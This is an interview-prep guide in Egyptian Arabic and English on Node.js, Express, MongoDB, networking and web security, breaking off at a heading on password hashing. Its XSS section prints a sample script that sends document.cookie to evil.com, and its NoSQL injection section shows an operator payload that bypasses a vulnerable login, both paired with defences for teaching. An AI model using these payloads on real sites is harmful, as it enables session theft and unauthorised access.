# 🚀 Giant Backend Interview Q&A Vault
### Node.js · Express · MongoDB · Mongoose · Networking · Security
> **للـ Freshers والـ Junior Backend Developers** — مش هتلاقي أسهل من كده تحضير إنترفيو 💪
> الأسئلة مرتبة من **Easy → Medium**. كل إجابة فيها "الـ Sweet Spot" — مش أقل من اللي المحاور عايزه ومش أكتر من اللي هيخليك تبان بتحفظ من غير فهم.

---

## ⚡ Part 1 — Node.js & Express

---

### 1. إيه هو الـ Event Loop في Node.js؟

الـ Event Loop هو "قلب" Node.js. خليك تتخيل إن Node عنده **Call Stack واحد بس** — يعني بيشتغل بـ Single Thread. طيب إزاي بيعمل حاجات كتير في نفس الوقت زي قراءة ملفات وبعد requests؟

الجواب: عن طريق الـ **Event Loop**. لما Node بيلاقي عملية async (زي `fs.readFile` أو `setTimeout`)، بيديها لـ **libuv** (وهو C++ library بيشتغل في الخلفية). لما العملية تخلص، بيحط الـ Callback في **Callback Queue**. الـ Event Loop بييجي يشوف، لو الـ Call Stack فاضي، بيجيب الـ Callback ده ويشغله.

```javascript
console.log("1 - Start"); // Synchronous — runs first

setTimeout(() => {
  console.log("3 - Timeout callback"); // Async — runs after Call Stack is empty
}, 0);

console.log("2 - End"); // Synchronous — runs second

// Output order: 1, 2, 3
// Even with 0ms delay, setTimeout goes to the queue, not the stack
```

> **الخلاصة للإنترفيو:** Node.js is non-blocking بسبب الـ Event Loop. هو مش multi-threaded، هو single-threaded بس ذكي في إنه مش بيستنى.

---

### 2. إيه الفرق بين `process.nextTick()` و `setImmediate()`؟

دي سؤال بيفرق بين اللي حافظ واللي فاهم.

- **`process.nextTick()`**: بيشغّل الـ Callback **قبل** ما الـ Event Loop يكمل الـ Phase الحالية. يعني أولوية عالية جداً. بيتحط في **nextTick Queue**.
- **`setImmediate()`**: بيشغّل الـ Callback في نهاية الـ Event Loop cycle الحالية، تحديداً في الـ **Check Phase**.

```javascript
setImmediate(() => console.log("setImmediate")); // Runs after I/O phase
process.nextTick(() => console.log("nextTick"));  // Runs before next event loop phase
console.log("Synchronous");

// Output: Synchronous → nextTick → setImmediate
```

> **نصيحة:** استخدم `process.nextTick()` لو عايز تتأكد إن حاجة تتنفذ بعد الكود الحالي مباشرة بس قبل أي I/O. ابعد عنه لو مش عارف تماماً إيه اللي بتعمله لأنه ممكن يعمل starvation للـ Event Loop.

---

### 3. إيه هو الـ Middleware في Express وإزاي بيشتغل؟

الـ Middleware هو ببساطة **function** بتاخد `(req, res, next)` وبتتنفذ في المنتصف — بين ما الـ Request يوصل والـ Response يرجع.

تخيّل الـ Request رحلة قطار. كل Station هي Middleware. القطار بيوقف في كل Station، السكة حديد (Middleware) بتعمل حاجة (logging، auth check، parsing)، وبعدين بتقول `next()` عشان القطار يكمل للـ Station الجاية.

```javascript
const express = require("express");
const app = express();

// Global middleware — runs on every request
app.use((req, res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
  next(); // Pass control to the next middleware
});

// Route-specific middleware (e.g., auth guard)
const authMiddleware = (req, res, next) => {
  const token = req.headers.authorization;
  if (!token) {
    return res.status(401).json({ error: "Unauthorized" }); // Stop here, don't call next()
  }
  next(); // Token exists, move on
};

app.get("/dashboard", authMiddleware, (req, res) => {
  res.json({ message: "Welcome to dashboard" });
});
```

> **نقطة مهمة:** لو نسيت `next()` والـ middleware مش بعتت response، الـ Request هيتعلق forever. وده باغ شائع جداً في Junior Code.

---

### 4. إيه دور الـ `next()` وإيه الفرق لو بعتّ error فيها `next(err)`؟

الـ `next()` العادي: بيقول لـ Express "روح للـ Middleware الجاي".

لو بعتّ `next(err)` — يعني بعتّ argument فيها — Express بيفهم إن في Error حصلت وبيـskip كل الـ Regular Middleware ويروح على طول لـ **Error-Handling Middleware**.

الـ Error Middleware ليه signature مختلفة: بيبدأ بـ `(err, req, res, next)` — أربع parameters مش تلاتة.

```javascript
// Regular route — simulate an async error
app.get("/users/:id", async (req, res, next) => {
  try {
    const user = await User.findById(req.params.id);
    if (!user) throw new Error("User not found");
    res.json(user);
  } catch (err) {
    next(err); // Forward error to the error handler
  }
});

// Error-handling middleware — MUST have 4 params
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).json({ error: err.message });
});
```

> **في الإنترفيو:** لو سألوك "إزاي بتتعامل مع الـ Errors في Express؟"، هذا هو الجواب المتكامل.

---

### 5. إيه الـ `req` و `res` Object وأهم الـ Properties فيهم؟

- **`req`** (Request): بيمثل الـ HTTP Request الجاي من الـ Client. فيه كل المعلومات اللي الـ Client بعتها.
- **`res`** (Response): بيمثل الـ HTTP Response اللي إنت بتبعته للـ Client.

```javascript
app.post("/products", (req, res) => {
  // --- req properties ---
  const body   = req.body;         // Parsed request body (needs express.json() middleware)
  const params = req.params;       // URL params e.g., /products/:id
  const query  = req.query;        // Query string e.g., ?page=2&limit=10
  const headers = req.headers;     // Request headers (auth tokens, content-type, etc.)
  const method = req.method;       // HTTP method: GET, POST, PUT, DELETE

  // --- res methods ---
  res.status(201).json({ message: "Product created", data: body }); // Send JSON with status
  // res.send("Hello");          // Send plain text
  // res.redirect("/dashboard"); // Redirect to another route
  // res.sendFile("/path/file"); // Send a file
});
```

---

### 6. إيه الفرق بين `app.use()` و `app.get()`؟

| | `app.use()` | `app.get()` |
|---|---|---|
| **HTTP Method** | بيشتغل مع **كل** الـ Methods | بيشتغل مع GET بس |
| **Path Matching** | Prefix matching — `/api` بيشمل `/api/users` | Exact matching |
| **استخدام** | Middleware، Error handlers | Route handlers |

```javascript
// app.use() matches /api, /api/users, /api/products — all start with /api
app.use("/api", someMiddleware);

// app.get() matches ONLY exactly GET /users
app.get("/users", (req, res) => res.json([]));
```

---

### 7. إيه هو الـ `express.json()` ولماذا نحتاجه؟

لما الـ Client بيبعت Request بـ Body (POST/PUT)، الـ Body بييجي كـ **Raw Stream of Bytes**. Express مش بيعرف يقرأها لوحده.

`express.json()` هو **Built-in Middleware** بيعمل parse للـ Body اللي فيها `Content-Type: application/json` ويحطها في `req.body`.

```javascript
const app = express();

// Without this line, req.body will be undefined for JSON requests
app.use(express.json());

// Now req.body is a proper JavaScript object
app.post("/login", (req, res) => {
  const { email, password } = req.body; // Works because of express.json()
  // ... authentication logic
});
```

> بدونه، `req.body` هيكون `undefined` وهتتساءل ليه الكود شغال على Postman بس مش بيشتغل في الـ Production!

---

### 8. إيه الفرق بين Synchronous و Asynchronous في Node.js؟

- **Synchronous**: الكود بيتنفذ سطر بسطر. السطر الجاي مش بيتنفذ غير لما السطر الحالي يخلص. لو السطر بياخد وقت (زي قراءة ملف كبير)، كل حاجة تانية **بتوقف**.
- **Asynchronous**: بيبدأ الـ Operation وبيكمل في تنفيذ باقي الكود. لما الـ Operation تخلص، بيرجع بالنتيجة عن طريق **Callback/Promise/async-await**.

```javascript
const fs = require("fs");

// --- Synchronous (BLOCKING) — Avoid in production servers ---
const data = fs.readFileSync("./bigfile.txt", "utf8"); // Everything stops here
console.log(data);

// --- Asynchronous (NON-BLOCKING) — The Node.js way ---
fs.readFile("./bigfile.txt", "utf8", (err, data) => {
  if (err) throw err;
  console.log(data); // Runs when file is ready, server keeps running meanwhile
});
console.log("This runs immediately, without waiting for the file!");
```

---

## 🍃 Part 2 — MongoDB & Mongoose

---

### 9. إيه الفرق بين BSON و JSON في MongoDB؟

**JSON** (JavaScript Object Notation): Text format، بيُقرأ من البني آدمين، بيشتغل معاه في الـ Application Layer.

**BSON** (Binary JSON): ده الفورمات اللي MongoDB بيخزّن فيه البيانات فعلياً على الـ Disk وبيبعته على الـ Network. فيه مزايا:

1. **أسرع** في القراءة والكتابة لأنه Binary
2. **بيدعم Types أكتر** زي `Date`، `ObjectId`، `Binary Data`، و `Decimal128` — حاجات JSON مش بيدعمها أصلاً
3. **أكبر حجماً شوية** بسبب الـ Metadata الإضافية

```javascript
// What YOU write (JSON-like JavaScript object)
const doc = {
  name: "Ahmed",
  createdAt: new Date(),     // JavaScript Date object
  _id: new ObjectId(),       // MongoDB ObjectId — not possible in pure JSON
  score: 99.5
};

// MongoDB stores this as BSON internally
// BSON knows the TYPE of each field, unlike JSON which is all strings/numbers
```

> **خلاصة:** إنت بتكتب JavaScript Objects، الـ Mongoose Driver بيحولها لـ BSON قبل ما يبعتها لـ MongoDB.

---

### 10. إيه هو الـ `ObjectId` في MongoDB؟

الـ `ObjectId` هو الـ Default type للـ `_id` field في أي Document في MongoDB. هو **12 bytes** (بيتعرض كـ 24 hex characters) وبيتكون من:

- **4 bytes**: Unix Timestamp (وقت الإنشاء)
- **5 bytes**: Random value (عشان ضمان الـ Uniqueness)
- **3 bytes**: Incrementing counter

```javascript
const { ObjectId } = require("mongodb");

const id = new ObjectId();
console.log(id.toString());         // e.g., "64f1a2b3c4d5e6f7a8b9c0d1"
console.log(id.getTimestamp());     // Returns the creation date — cool feature!

// In Mongoose queries, you can use the string directly — Mongoose auto-converts
const user = await User.findById("64f1a2b3c4d5e6f7a8b9c0d1");
// Or use ObjectId explicitly
const user2 = await User.findById(new ObjectId("64f1a2b3c4d5e6f7a8b9c0d1"));
```

> **نقطة ذهبية في الإنترفيو:** الـ `ObjectId` بيتوليد على الـ Client (الـ Driver)، مش على الـ Server. ده بيدي ميزة performance لأن MongoDB Server مش بيتدخل في عملية الـ ID Generation.

---

### 11. إيه الفرق بين الـ Schema والـ Model في Mongoose؟

- **Schema**: هو الـ Blueprint أو الـ Template — بيحدد شكل الـ Document (الـ Fields، الـ Types، الـ Validation، الـ Defaults). هو مجرد تعريف، مش بيتكلم مع الـ Database.
- **Model**: هو الـ Class اللي اتعمل من الـ Schema. ده اللي بتتعامل معاه عملياً — بيعمل CRUD operations على الـ Database.

```javascript
const mongoose = require("mongoose");

// 1. Define the Schema — the blueprint
const productSchema = new mongoose.Schema({
  name: {
    type: String,
    required: [true, "Product name is required"], // Validation message
    trim: true,
  },
  price: {
    type: Number,
    min: [0, "Price cannot be negative"],
  },
  category: {
    type: String,
    enum: ["electronics", "clothing", "food"], // Only these values allowed
    default: "electronics",
  },
  createdAt: { type: Date, default: Date.now },
});

// 2. Create the Model from the Schema
// "Product" → model name → Mongoose creates "products" collection in MongoDB
const Product = mongoose.model("Product", productSchema);

// 3. Use the Model to interact with the database
const newProduct = new Product({ name: "Laptop", price: 999 });
await newProduct.save();
```

---

### 12. إيه هو `populate()` في Mongoose وإمتى بنستخدمه؟

الـ `populate()` بيحل مشكلة الـ **Referenced Documents**. لما عندك Document فيه `ObjectId` بيرفر لـ Document في Collection تانية، `populate()` بيجيب الـ Document المرفر إليه ده ويحطه في مكانه.

```javascript
// --- Schema Definitions ---
const authorSchema = new mongoose.Schema({
  name: String,
  email: String,
});

const bookSchema = new mongoose.Schema({
  title: String,
  author: { type: mongoose.Schema.Types.ObjectId, ref: "Author" }, // Reference to Author
});

const Author = mongoose.model("Author", authorSchema);
const Book = mongoose.model("Book", bookSchema);

// --- Without populate ---
const book = await Book.findById(someId);
// book.author = ObjectId("64f1a...") — just the ID, useless for display

// --- With populate ---
const bookWithAuthor = await Book.findById(someId).populate("author");
// book.author = { name: "Naguib Mahfouz", email: "nm@eg.com" } — full object!

// You can also populate specific fields only
const bookLean = await Book.findById(someId).populate("author", "name -_id");
```

> **تحذير مهم:** `populate()` بيعمل **Query إضافية** على الـ Database. لو عندك كتب كتير وكلها محتاجة Author data، ممكن يقع في الـ N+1 Problem. هنتكلم عنه بعدين!

---

### 13. إيه الفرق بين `save()` و `findByIdAndUpdate()` في Mongoose؟

| | `.save()` | `findByIdAndUpdate()` |
|---|---|---|
| **الـ Validators** | ✅ بيشغّل | ❌ مش بيشغّل by default |
| **الـ Hooks (pre/post)** | ✅ بيشغّل | ❌ مش بيشغّل by default |
| **الـ Performance** | أبطأ (Fetch + Update) | أسرع (Single DB Query) |
| **متى نستخدمه** | لما الـ Validation مهمة | Updates سريعة بدون validation |

```javascript
// --- Using .save() — full Mongoose lifecycle ---
const user = await User.findById(userId); // First query: fetch document
user.name = "Omar Updated";
user.email = "omar@new.com";
await user.save(); // Second query: triggers validators, hooks (pre-save, post-save)

// --- Using findByIdAndUpdate() — direct and fast ---
const updatedUser = await User.findByIdAndUpdate(
  userId,
  { $set: { name: "Omar Updated" } },
  {
    new: true,           // Return the updated document (not the old one)
    runValidators: true, // Opt-in: run schema validators on update
  }
);
```

> **وقتين تستخدم `.save()`:** لما عندك pre-save hooks (زي Password Hashing) أو لما الـ Business Logic محتاجة Validators تشتغل.

---

### 14. إيه هو `.lean()` في Mongoose وإمتى بيفيدنا؟

لما بتعمل Query عادية في Mongoose، بيرجع **Mongoose Document** — وده Object كبير فيه methods زي `.save()`، `.toJSON()`، `.populate()` وغيرها. الـ Object ده بياخد Memory أكتر وأبطأ في الـ Processing.

`.lean()` بيقول لـ Mongoose: "مش محتاج كل ده، رجّعلي Plain JavaScript Object بس."

```javascript
// --- Without .lean() — returns full Mongoose Document ---
const users = await User.find({});
// users[0] is a Mongoose Document — has .save(), .remove(), etc.
// More memory, slightly slower

// --- With .lean() — returns plain JS object ---
const users = await User.find({}).lean();
// users[0] is a plain JavaScript object { _id: ..., name: ..., email: ... }
// Faster, less memory, but you CANNOT call .save() or any Mongoose methods on it

// Perfect for READ-ONLY operations like API responses
app.get("/users", async (req, res) => {
  const users = await User.find({}).lean().select("name email -_id"); // Fast & lean
  res.json(users);
});
```

> **القاعدة:** بتعرض Data بس وما محتاجش تعدّلها؟ استخدم `.lean()`. محتاج تعدّل وتعمل `.save()`؟ ابعد عنه.

---

## 🗄️ Part 3 — Database Concepts & Famous Problems

---

### 15. إيه هو الـ N+1 Problem وإزاي بنحله؟

الـ N+1 Problem هو من أشهر مشاكل الـ Performance في Backend Development. اسمه جاي من الـ Math بتاعته.

**الـ Scenario:** عندك 100 Post، وكل Post عايز تعرض صاحبه (Author).

- **1 Query** لجيب الـ 100 Post
- **100 Queries** (N queries) — لكل Post بتعمل query لجيب الـ Author

يعني 101 Query عدل 1 — وده بيكسر الـ Performance.

```javascript
// --- THE PROBLEM: N+1 Pattern ---
const posts = await Post.find({}); // 1 query

for (const post of posts) {
  const author = await User.findById(post.authorId); // N queries — TERRIBLE!
  post.authorName = author.name;
}

// --- THE SOLUTION 1: populate() ---
const posts = await Post.find({}).populate("authorId", "name email");
// Only 2 queries total — Mongoose handles it smartly

// --- THE SOLUTION 2: Manual Batch Fetch ---
const posts = await Post.find({});
const authorIds = posts.map((p) => p.authorId); // Collect all IDs
const authors = await User.find({ _id: { $in: authorIds } }); // 1 batch query

// Create a lookup map for O(1) access
const authorMap = {};
authors.forEach((a) => (authorMap[a._id.toString()] = a));

// Attach author data without extra queries
const enrichedPosts = posts.map((p) => ({
  ...p.toObject(),
  author: authorMap[p.authorId.toString()],
}));
```

> **الـ N+1 Problem مش بس في MongoDB** — بيحصل في كل Database حتى SQL. وكتير من الـ Interviewers بيسألوا عنه لأنه بيفرق بين الـ Junior اللي بيكتب كود شغال والـ Senior اللي بيفكر في Performance.

---

### 16. إيه هو الـ Indexing في MongoDB وليه مهم؟

الـ Index زي فهرس الكتاب. بدونه، MongoDB لازم يقرأ **كل Document** في الـ Collection عشان يلاقي اللي إنت عايزه — وده بيتسمى **COLLSCAN (Collection Scan)**.

بالـ Index، MongoDB بيقدر يجمب على الـ Documents المطلوبة مباشرة — وده بيتسمى **IXSCAN (Index Scan)**.

```javascript
// --- Creating Indexes in Mongoose Schema ---
const userSchema = new mongoose.Schema({
  email: {
    type: String,
    unique: true, // Automatically creates a unique index
    index: true,  // Explicitly create an index
  },
  name: String,
  createdAt: { type: Date, default: Date.now },
});

// Compound Index — useful for queries that filter by multiple fields
userSchema.index({ name: 1, createdAt: -1 }); // 1 = ascending, -1 = descending

// --- Check if your query uses an index ---
// In MongoDB shell:
// db.users.find({ email: "test@test.com" }).explain("executionStats")
// Look for "IXSCAN" — good. "COLLSCAN" — add an index!
```

> **متى لا تضيف Index؟** الـ Indexes بتاخد مكان على الـ Disk وبتبطّئ الـ Write Operations (INSERT/UPDATE/DELETE) لأن MongoDB لازم يحدّث الـ Index مع كل عملية. الـ Rule العام: Index على الـ Fields اللي بتعمل عليها `find()`, `sort()`, أو `where()` كتير.

---

### 17. إيه هو ACID وإيه هو BASE؟ وإيه الـ CAP Theorem ببساطة؟

#### ACID (SQL Databases — Postgres, MySQL)
Properties بتضمن إن الـ Transactions موثوقة:
- **A**tomicity: كل الـ Transaction بتنجح أو كلها بتفشل (مفيش نص ناجح)
- **C**onsistency: البيانات دايماً في حالة valid قبل وبعد الـ Transaction
- **I**solation: الـ Transactions المتزامنة مش بتأثر على بعض
- **D**urability: لما الـ Transaction تنجح، البيانات بتتحفظ حتى لو الـ Server وقع

#### BASE (NoSQL Databases — MongoDB, Cassandra)
- **B**asically **A**vailable: النظام متاح دايماً (الـ Availability أولوية)
- **S**oft State: الـ State ممكن يتغير مع الوقت حتى بدون Input (Eventual Consistency)
- **E**ventually Consistent: البيانات هتكون Consistent في النهاية، بس مش بالضرورة فوراً

#### CAP Theorem ببساطة:
أي Distributed System مقدرش يضمن الـ 3 دول في نفس الوقت:
- **C**onsistency: كل Node بيشوف نفس البيانات في نفس الوقت
- **A**vailability: كل Request بيجيب Response دايماً
- **P**artition Tolerance: النظام بيشتغل حتى لو في Network Failure بين الـ Nodes

**SQL**: بيختار **CP** — Consistent + Partition Tolerant، بس ممكن يبقى غير متاح وقت الـ Failure.
**MongoDB**: بيختار **AP** — Available + Partition Tolerant، بس الـ Consistency ممكن تتأخر.

> **الخلاصة للإنترفيو:** ACID مهم لما البيانات حساسة زي المصاريف والبنوك. BASE مهم لما الـ Scale والـ Performance أهم زي Social Media والـ Analytics.

---

### 18. إيه الفرق بين الـ Embedded Documents والـ References في MongoDB؟

دي من أهم قرارات الـ Schema Design في MongoDB.

**Embedded (Denormalized):**
بتحط الـ Related Data جوه نفس الـ Document.

```javascript
// Embedding: User has addresses inside the same document
const userSchema = new mongoose.Schema({
  name: String,
  addresses: [
    {
      street: String,
      city: String,
      isPrimary: Boolean,
    },
  ],
  // Addresses are always fetched with the user — one query, fast!
});
```

**Referenced (Normalized):**
بتحط `ObjectId` بيشاور على Document في Collection تانية.

```javascript
// Referencing: Order references User and Product by ID
const orderSchema = new mongoose.Schema({
  user: { type: mongoose.Schema.Types.ObjectId, ref: "User" },
  products: [{ type: mongoose.Schema.Types.ObjectId, ref: "Product" }],
  totalPrice: Number,
  // Need populate() to get user/product data — extra query
});
```

| | Embedded | Referenced |
|---|---|---|
| **Query** | أسرع (1 Query) | أبطأ (+ populate) |
| **Update** | ممكن تكون صعبة | أسهل |
| **متى** | Data صغيرة ومرتبطة دايماً | Data كبيرة أو مستقلة |

---

## 🌐 Part 4 — Basic Networking

---

### 19. إيه الفرق بين الـ Forward Proxy والـ Reverse Proxy؟

#### Forward Proxy
بيقف **أمام الـ Clients** ويعمل Requests نيابة عنهم للـ Internet. الـ Server مش شايف الـ Client الحقيقي، شايف الـ Proxy بس.

**استخدامات:** Corporate firewalls، Bypassing geo-restrictions (VPN)، Anonymity.

```
[Client] → [Forward Proxy] → [Internet / Server]
Server sees: Proxy IP only, not the real client IP
```

#### Reverse Proxy
بيقف **أمام الـ Servers** ويستقبل الـ Requests من الـ Clients ويوجهها للـ Server الصح. الـ Client مش شايف الـ Servers الحقيقيين.

**استخدامات:** Load Balancing، SSL Termination، Caching، Security.

```
[Client] → [Reverse Proxy (e.g., Nginx)] → [Server 1 / Server 2 / Server 3]
Client sees: only the Proxy IP, not the real server IPs
```

> **أمثلة شهيرة:** Nginx و HAProxy شهيرين كـ Reverse Proxies. في Node.js projects، غالباً بيحطوا Nginx قدام الـ Node Server عشان يعمل SSL Termination وStatic File Serving أسرع من Node.

---

### 20. إيه هو الـ Load Balancer وإيه الـ Algorithms بتاعته؟

الـ Load Balancer هو الـ "Traffic Controller" — بيوزع الـ Requests على عدة Servers عشان:
1. ما يحصلش Overload على Server واحد
2. لو Server وقع، الـ Traffic يتحول لغيره (High Availability)
3. Scalability — تقدر تضيف Servers بسهولة

#### أشهر الـ Algorithms:

- **Round Robin**: كل Request بيروح للـ Server الجاي في الدور. Simple وEfficient لو الـ Servers متساوية.
- **Least Connections**: بيبعت الـ Request للـ Server اللي عنده أقل Connections حالياً. أذكى لو الـ Requests مش متساوية في الوقت.
- **IP Hash**: بيعمل Hash لـ IP الـ Client ويبعته دايماً لنفس الـ Server — مفيد للـ Session Persistence.
- **Weighted Round Robin**: بيدي كل Server وزن — الـ Server الأقوى بياخد Requests أكتر.

```
Round Robin:
Request 1 → Server A
Request 2 → Server B
Request 3 → Server C
Request 4 → Server A  (cycle repeats)
```

---

### 21. إيه هي أهم الـ HTTP Verbs وإمتى بنستخدم كل واحد؟

الـ HTTP Verbs (أو Methods) بتعبّر عن **نية الـ Action** اللي الـ Client عايز يعملها.

| Verb | الاستخدام | Idempotent? |
|---|---|---|
| **GET** | جيب Data، مش بيغير حاجة | ✅ Yes |
| **POST** | إنشاء Resource جديد | ❌ No |
| **PUT** | استبدال Resource كامل | ✅ Yes |
| **PATCH** | تعديل جزء من الـ Resource | ✅ Generally |
| **DELETE** | حذف Resource | ✅ Yes |

> **الـ Idempotent معناه:** لو بعتّ نفس الـ Request أكتر من مرة، النتيجة هي نفسها. مثلاً DELETE لو حذفت User مرتين، النتيجة نفسها (الـ User محذوف). لكن POST لو بعته مرتين، هتنشأ Resource جديد في كل مرة.

---

### 22. إيه أهم الـ HTTP Status Codes اللي لازم تعرفها؟

```
2xx — Success
  200 OK           — Standard success
  201 Created      — Resource was created (after POST)
  204 No Content   — Success but no body (after DELETE)

3xx — Redirection
  301 Moved Permanently — URL changed forever (SEO important)
  302 Found             — Temporary redirect
  304 Not Modified      — Client can use cached version

4xx — Client Errors (الغلطة من الـ Client)
  400 Bad Request        — Invalid input / malformed request
  401 Unauthorized       — Not authenticated (no valid token)
  403 Forbidden          — Authenticated but no permission
  404 Not Found          — Resource doesn't exist
  409 Conflict           — Duplicate resource (e.g., email already exists)
  429 Too Many Requests  — Rate limit exceeded

5xx — Server Errors (الغلطة من الـ Server)
  500 Internal Server Error — Generic server crash
  502 Bad Gateway           — Proxy got invalid response from upstream
  503 Service Unavailable   — Server overloaded or down for maintenance
```

> **نقطة مهمة:** الفرق بين 401 و 403 بيجي في الإنترفيو كتير. **401** = مش عارف إنت مين (غير Authenticated). **403** = عارف إنت مين، بس مش عندك Permission (غير Authorized).

---

### 23. إيه هو الـ REST API وإيه مبادئه الأساسية؟

الـ REST (Representational State Transfer) هو Architecture Style للـ APIs، مش Protocol. الـ APIs اللي بتتبع قواعده بتتسمى "RESTful".

**المبادئ الأساسية:**

1. **Stateless**: كل Request لازم يحتوي على كل المعلومات المطلوبة. الـ Server مش بيحفظ State للـ Client بين الـ Requests.
2. **Client-Server**: الـ Frontend (Client) والـ Backend (Server) منفصلين تماماً.
3. **Uniform Interface**: URLs بتمثّل Resources، الـ HTTP Verbs بتحدد الـ Action.
4. **Cacheable**: الـ Responses لازم تبيّن إذا ممكن تتعمل Cache أو لأ.
5. **Layered System**: الـ Client مش عارف عن الـ Layers الداخلية (Load Balancers, Caches).

```javascript
// RESTful API Design — Express Example
const router = express.Router();

router.get("/users",          getAllUsers);     // GET    /users
router.get("/users/:id",      getUserById);    // GET    /users/:id
router.post("/users",         createUser);     // POST   /users
router.put("/users/:id",      replaceUser);    // PUT    /users/:id
router.patch("/users/:id",    updateUser);     // PATCH  /users/:id
router.delete("/users/:id",   deleteUser);     // DELETE /users/:id
```

---

## 🔒 Part 5 — Security & Auth

---

### 24. إيه الفرق بين JWT والـ Sessions؟

#### Sessions (Traditional)
الـ Server بيحفظ الـ Session Data في Memory أو Database. الـ Client بياخد **Session ID** بس (في Cookie) ويبعته مع كل Request.

```
Client                Server              Database
  |---POST /login---→  |                    |
  |                    |---Save session---→  |
  |←--Cookie(sid)---   |                    |
  |---GET /profile--→  |---Find session---→  |
  |                    |←---Session data---  |
  |←---Profile data--- |                    |
```

#### JWT (JSON Web Token)
الـ Server مش بيحفظ حاجة. الـ Token نفسه بيحتوي على الـ Data (مـ encrypted مش مـ encrypted، بس مـ signed). الـ Client بيبعت الـ Token مع كل Request.

```javascript
const jwt = require("jsonwebtoken");

// --- On Login: Create the token ---
const payload = { userId: user._id, role: user.role };
const token = jwt.sign(payload, process.env.JWT_SECRET, { expiresIn: "7d" });
// Send token to client — usually in response body

// --- On Protected Route: Verify the token ---
const authMiddleware = (req, res, next) => {
  const token = req.headers.authorization?.split(" ")[1]; // "Bearer <token>"
  if (!token) return res.status(401).json({ error: "No token provided" });

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET); // Throws if invalid/expired
    req.user = decoded; // Attach user data to request
    next();
  } catch {
    res.status(401).json({ error: "Invalid or expired token" });
  }
};
```

| | JWT | Sessions |
|---|---|---|
| **الـ State** | Stateless | Stateful |
| **الـ Storage** | Client بيحفظه | Server بيحفظه |
| **الـ Scalability** | أسهل (No DB lookup) | صعب مع Multiple Servers |
| **الـ Revocation** | صعب (لحد ما يـ expire) | سهل (امسح الـ Session) |

---

### 25. إيه هو الـ CORS ولماذا بيحصل؟

الـ CORS (Cross-Origin Resource Sharing) مش بـ Error من الـ Server — ده قرار من الـ **Browser** عشان يحمي المستخدم.

**الـ Same-Origin Policy**: المتصفح بيمنع JavaScript في `https://myapp.com` من إنها تعمل Request لـ `https://api.other.com` — لأن الـ Origin مختلف.

الـ Browser بيبص على ثلاث حاجات لتحديد الـ Origin: **Protocol + Domain + Port**.

الحل: الـ Server يبعت **CORS Headers** في الـ Response عشان يقول للمتصفح "أنا موافق على إن هذا الـ Origin يكلمني".

```javascript
const cors = require("cors");

// Allow ALL origins — Not recommended for production!
app.use(cors());

// Recommended: Allow specific origins only
app.use(
  cors({
    origin: ["https://myfrontend.com", "https://admin.myfrontend.com"],
    methods: ["GET", "POST", "PUT", "DELETE"],
    allowedHeaders: ["Content-Type", "Authorization"],
    credentials: true, // Allow cookies to be sent cross-origin
  })
);

// The server will send these headers in the response:
// Access-Control-Allow-Origin: https://myfrontend.com
// Access-Control-Allow-Methods: GET, POST, PUT, DELETE
```

> **مهم:** الـ CORS مش Security Feature من جانب الـ Server — ده Browser Enforcement. الـ Postman مش بيأثر عليه لأن Postman مش Browser. لو محتاج Security حقيقية، استخدم Authentication.

---

### 26. إيه هو الـ XSS (Cross-Site Scripting) وكيف نحمي منه؟

الـ XSS بيحصل لما المهاجم يقدر يحقن JavaScript Code خبيث في صفحتك. لو الموقع بيعرض Input المستخدم بدون Sanitization، الكود ده ممكن يتنفذ في Browser الضحية.

```html
<!-- User input that gets stored in DB and displayed in HTML -->
<!-- Malicious user submits: -->
<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>

<!-- If displayed without sanitization, this script runs for every visitor! -->
```

**الحماية:**

```javascript
// 1. Sanitize user input before storing (server-side)
const DOMPurify = require("dompurify"); // For HTML sanitization
const { JSDOM } = require("jsdom");

const window = new JSDOM("").window;
const purify = DOMPurify(window);
const cleanInput = purify.sanitize(req.body.comment); // Strips dangerous HTML/JS

// 2. Set proper HTTP Headers (Helmet.js does this automatically)
const helmet = require("helmet");
app.use(helmet()); // Sets Content-Security-Policy and other security headers

// Content-Security-Policy prevents inline scripts from running
// X-XSS-Protection header enables browser's built-in XSS filter

// 3. When rendering in HTML templates, always ESCAPE output
// In Handlebars: {{comment}} auto-escapes, {{{comment}}} doesn't — never use triple braces for user input!
```

---

### 27. إيه هو الـ NoSQL Injection وكيف نحمي منه في MongoDB؟

بخلاف SQL Injection، الـ NoSQL Injection في MongoDB بيحصل لما المهاجم يبعت **MongoDB Operators** كـ Input عشان يتجاوز الـ Authentication أو يقرأ Data مش مسموح له بيها.

```javascript
// --- VULNERABLE CODE ---
app.post("/login", async (req, res) => {
  const { email, password } = req.body;
  // Attacker sends: { "email": { "$gt": "" }, "password": { "$gt": "" } }
  // This MongoDB query matches ALL users — bypass authentication!
  const user = await User.findOne({ email, password }); // DANGEROUS!
});

// --- SECURE CODE ---
app.post("/login", async (req, res) => {
  // 1. Validate input types first (Joi/Zod ensures they're strings, not objects)
  const { error } = loginSchema.validate(req.body);
  if (error) return res.status(400).json({ error: error.details[0].message });

  const { email, password } = req.body;

  // 2. Find by email only, then verify password separately
  const user = await User.findOne({ email: String(email) }); // Force string type
  if (!user || !(await bcrypt.compare(password, user.passwordHash))) {
    return res.status(401).json({ error: "Invalid credentials" });
  }

  // 3. Use Mongoose — it sanitizes queries by default for known operators
  res.json({ token: generateToken(user) });
});
```

---

### 28. إيه هو الـ Rate Limiting ولماذا نحتاجه؟

الـ Rate Limiting بيحدد عدد الـ Requests اللي ممكن Client يبعتها في وقت معين. بيحمي من:

1. **Brute Force Attacks**: حد بيجرب آلاف الـ Passwords في ثواني
2. **DDoS Attacks**: إغراق الـ Server بـ Requests
3. **Resource Abuse**: شخص بيستهلك موارد السيرفر بشكل غير عادل

```javascript
const rateLimit = require("express-rate-limit");

// General rate limiter for all routes
const generalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15-minute window
  max: 100,                  // Max 100 requests per window per IP
  standardHeaders: true,     // Return rate limit info in the RateLimit-* headers
  message: { error: "Too many requests, please try again later." },
});

// Strict limiter for sensitive routes (login, register)
const authLimiter = rateLimit({
  windowMs: 60 * 60 * 1000, // 1-hour window
  max: 10,                   // Only 10 login attempts per hour per IP
  message: { error: "Too many login attempts. Please wait an hour." },
});

app.use(generalLimiter);              // Apply to all routes
app.use("/auth/login", authLimiter);  // Stricter limit on login
app.use("/auth/register", authLimiter);
```

---

### 29. ليه بنعمل Hash للـ Passwords ومش بنخزّنها كـ Plain Text؟

